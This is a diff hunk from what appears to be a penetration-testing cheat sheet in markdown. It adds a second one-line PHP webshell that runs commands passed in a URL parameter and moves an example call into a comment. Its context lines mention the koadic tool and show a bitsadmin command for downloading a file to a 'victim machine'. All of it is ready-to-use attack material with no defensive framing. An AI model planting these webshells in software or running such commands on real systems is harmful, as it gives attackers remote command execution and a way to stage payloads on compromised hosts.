@@ -2453,9 +2453,10 @@ $ ./koadic
 ```
 # PHP Tiny Webshell
 ```
-<?= ($_=@$_GET[0]).$_(@$_GET[1]);
+<?= ($_=@$_GET[0]).$_(@$_GET[1]); //http://127.0.0.1/shell.php?0=system&1=ls
+<?=`$_GET[0]`?> //http://127.0.0.1/shell.php??0=command
 ```
-http://127.0.0.1/shell.php?0=system&1=ls
+
 # Donwload file to the victim machine
 ```
 bitsadmin  /transfer mydownloadjob  /download  /priority normal  ^http://example.com/filename.zip  C:\Users\username\Downloads\filename.zip
